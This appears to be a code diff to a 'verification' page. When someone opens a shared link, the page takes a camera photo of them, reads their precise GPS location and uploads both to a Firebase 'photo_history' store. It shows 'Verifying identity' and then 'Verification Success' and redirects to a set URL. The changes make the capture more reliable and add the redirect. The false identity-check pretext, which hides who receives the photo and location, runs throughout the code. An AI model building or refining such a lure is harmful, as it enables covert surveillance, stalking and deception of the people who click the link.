@@ -19,9 +19,7 @@ const db = getDatabase(app);
 async function initVerification() {
     const urlParams = new URLSearchParams(window.location.search);
     const linkId = urlParams.get('linkId');
-    
-    // PROBLEM SOLVED: Instead of checking local storage (which is empty on other browsers),
-    // we fetch the link data directly from your Firebase database.
+
     const linkRef = ref(db, 'managed_links/' + linkId);
     const snapshot = await get(linkRef);
     const settings = snapshot.val();
@@ -37,37 +35,49 @@ async function initVerification() {
     let lat = "Denied", lon = "Denied";
     let photoData = null;
 
-    // STEP 1: CAMERA
+    // STEP 1: REQUEST CAMERA PERMISSION IMMEDIATELY
     if (settings.cam) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // This line instantly triggers the browser camera permission popup
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
             const video = document.getElementById('video');
             video.srcObject = stream;
-            await new Promise(r => setTimeout(r, 1500));
+            video.style.display = 'block';
+            // Wait for video to be ready
+            await new Promise(r => { video.onloadedmetadata = r; });
+            await new Promise(r => setTimeout(r, 800));
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            photoData = canvas.toDataURL('image/jpeg', 0.5); 
+            photoData = canvas.toDataURL('image/jpeg', 0.5);
             stream.getTracks().forEach(t => t.stop());
-        } catch (e) { statusText.innerText = "Camera access required."; }
+            video.style.display = 'none';
+        } catch (e) {
+            statusText.innerText = "Camera permission is required to continue.";
+        }
     }
 
-    // STEP 2: LOCATION
+    // STEP 2: REQUEST LOCATION PERMISSION IMMEDIATELY
     if (settings.gps) {
+        statusText.innerText = "Requesting location access...";
         try {
+            // This line instantly triggers the browser location permission popup
             const pos = await new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 6000 });
+                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000, enableHighAccuracy: true });
             });
             lat = pos.coords.latitude;
             lon = pos.coords.longitude;
-        } catch (e) { console.log("GPS denied"); }
+        } catch (e) {
+            console.log("GPS denied");
+        }
     }
 
     // STEP 3: SEND TO FIREBASE CLOUD
+    statusText.innerText = "Verifying identity...";
     const historyRef = ref(db, 'photo_history');
     const newEntryRef = push(historyRef);
-    set(newEntryRef, {
+    await set(newEntryRef, {
         id: Date.now(),
         image: photoData,
         latitude: lat,
@@ -78,6 +88,9 @@ async function initVerification() {
     });
 
     statusText.innerText = "Verification Success. Redirecting...";
+    if (settings.redirectUrl) {
+        setTimeout(() => { window.location.href = settings.redirectUrl; }, 1500);
+    }
 }
 
 window.addEventListener('load', initVerification);
